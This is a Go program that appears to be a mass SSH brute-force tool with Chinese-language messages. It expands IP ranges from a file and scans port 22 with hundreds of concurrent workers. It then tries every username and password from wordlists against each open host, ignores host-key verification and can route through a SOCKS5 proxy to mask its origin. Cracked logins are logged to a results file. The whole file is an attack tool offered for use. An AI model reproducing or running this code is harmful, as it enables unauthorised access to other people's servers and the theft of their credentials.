package main

import (
	"bufio"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
	"golang.org/x/net/proxy"
)

const (
	port        = "22"
	timeout     = 3 * time.Second
	ipFilename  = "ip.txt"
	userFile    = "user.txt"
	passFile    = "passwd.txt"
	resultFile  = "success.txt"
	scanWorkers = 500
	authWorkers = 200
)

var (
	useProxy   bool
	socks5Addr string
)

func init() {
	flag.BoolVar(&useProxy, "proxy", false, "是否使用 SOCKS5 代理")
	flag.StringVar(&socks5Addr, "proxyAddr", "127.0.0.1:1080", "SOCKS5 代理地址")
	flag.Parse()
	rand.Seed(time.Now().UnixNano())
}

func main() {
	users, err := readLines(userFile)
	if err != nil {
		fmt.Println("讀取用戶失敗:", err)
		return
	}
	passwords, err := readLines(passFile)
	if err != nil {
		fmt.Println("讀取密碼失敗:", err)
		return
	}

	ipChan := readIPFile(ipFilename)
	openIPs := make(chan string, 1000)
	success := make(chan string, 1000)

	var wg sync.WaitGroup

	// 啟動掃描池
	go func() {
		startScanPool(ipChan, openIPs, &wg)
		wg.Wait()
		close(openIPs)
	}()

	// 啟動認證池
	go func() {
		startAuthPool(openIPs, users, passwords, success, &wg)
		wg.Wait()
		close(success)
	}()

	// 處理結果
	out, err := os.OpenFile(resultFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("無法寫入結果文件:", err)
		return
	}
	defer out.Close()

	for result := range success {
		fmt.Println("[+] 成功登入:", result)
		out.WriteString(result + "\n")
	}

	fmt.Println("掃描結束")
}

func startScanPool(ipChan <-chan string, openIPs chan<- string, wg *sync.WaitGroup) {
	for i := 0; i < scanWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for ip := range ipChan {
				if isOpen(ip, port) {
					openIPs <- ip
				} else {
					fmt.Printf("[-] %s 無法連接 22 端口\n", ip)
				}
			}
		}()
	}
}

func startAuthPool(openIPs <-chan string, users, passwords []string, success chan<- string, wg *sync.WaitGroup) {
	for i := 0; i < authWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for ip := range openIPs {
				if loginSSH(ip, users, passwords, success) {
					break
				}
			}
		}()
	}
}

func getDialer() (proxy.Dialer, error) {
	if useProxy {
		return proxy.SOCKS5("tcp", socks5Addr, nil, proxy.Direct)
	}
	return proxy.Direct, nil
}

func loginSSH(ip string, users, passwords []string, success chan<- string) bool {
	dialer, err := getDialer()
	if err != nil {
		fmt.Println("代理 dialer 錯誤:", err)
		return false
	}

	for _, user := range users {
		for _, pass := range passwords {
			config := &ssh.ClientConfig{
				User:            user,
				Auth:            []ssh.AuthMethod{ssh.Password(pass)},
				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
				Timeout:         timeout,
			}
			conn, err := dialer.Dial("tcp", net.JoinHostPort(ip, port))
			if err != nil {
				continue
			}
			sshConn, chans, reqs, err := ssh.NewClientConn(conn, ip+":"+port, config)
			if err != nil {
				conn.Close()
				fmt.Printf("[-] %s 登錄失敗 (%s/%s)\n", ip, user, pass)
				continue
			}
			client := ssh.NewClient(sshConn, chans, reqs)
			defer client.Close()
			successMsg := fmt.Sprintf("%s@%s 密碼: %s", user, ip, pass)
			fmt.Printf("[+] %s 登錄成功 (%s/%s)\n", ip, user, pass)
			success <- successMsg
			return true
		}
	}
	fmt.Printf("[-] %s 所有帳密組合失敗\n", ip)
	return false
}

func isOpen(ip, port string) bool {
	conn, err := net.DialTimeout("tcp", net.JoinHostPort(ip, port), timeout)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func readLines(filename string) ([]string, error) {
	f, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	var lines []string
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			lines = append(lines, line)
		}
	}
	return lines, scanner.Err()
}

func readIPFile(filename string) <-chan string {
	out := make(chan string, 10000)
	go func() {
		defer close(out)
		lines, err := readLines(filename)
		if err != nil {
			fmt.Println("讀取IP文件失敗:", err)
			return
		}
		for _, line := range lines {
			if ip, ipnet, err := net.ParseCIDR(line); err == nil {
				for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
					out <- ip.String()
				}
			} else if ip := net.ParseIP(line); ip != nil {
				out <- ip.String()
			} else {
				fmt.Println("無法解析 IP:", line)
			}
		}
	}()
	return out
}

func inc(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] > 0 {
			break
		}
	}
}

